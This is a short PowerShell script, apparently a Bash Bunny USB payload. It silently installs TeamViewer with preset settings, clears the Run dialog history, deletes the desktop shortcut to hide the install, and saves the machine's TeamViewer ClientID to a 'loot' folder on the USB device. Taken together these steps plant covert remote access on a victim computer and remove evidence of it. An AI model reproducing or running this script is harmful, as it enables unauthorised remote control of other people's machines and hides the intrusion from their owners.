# Vars for log
$DestFile = "$env:COMPUTERNAME-TV-ID.txt"
$ToolPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'bin')
$DestPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\TeeVee')
$Dest = "$DestPath\$DestFile"

# Clear Run history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue

# Install Team Viewer
Start-Process -wait $ToolPath\TeamViewer_Setup.exe /S
Start-Sleep -Seconds 2
net stop teamviewer
Start-Sleep -Seconds 2
reg import $ToolPath\tv-settings.reg
Start-Sleep -Seconds 2
net start teamviewer
Start-Sleep -Seconds 2
(Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name ClientID).ClientID > $dest
Remove-Item "$env:public\desktop\TeamViewer.lnk"
